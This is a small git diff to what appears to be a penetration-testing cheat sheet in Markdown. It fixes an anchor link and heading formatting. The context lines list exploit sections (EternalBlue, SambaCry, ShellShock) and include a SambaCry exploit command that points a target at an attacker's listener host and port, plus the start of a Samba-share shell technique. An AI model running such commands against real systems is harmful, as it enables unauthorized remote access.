@@ -27,7 +27,7 @@
   * [John the Ripper](#john-the-ripper)
   * [Hashcat](#hashcat)
   * [Local File Inclusions](#local-file-inclusions)
-  * [MS09-050](#ms09-50)
+  * [MS09-050](#ms09-050)
   * [EternalBlue](#eternalblue)
   * [SambaCry](#sambacry)
   * [ShellShock via SMTP](#shellshock-via-smtp)
@@ -481,12 +481,12 @@ python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
 ```
 
 #### ShellShock via SMTP
-CVE-2014-6271
+**CVE-2014-6271**
 ```bash
 # technique goes here
 ```
 
-##### Shell via Samba Logon Command
+#### Shell via Samba Logon Command
 ```bash
 mkdir /mnt/$TARGET
 sudo mount -t cifs //$TARGET/$SHARE /mnt/$TARGET
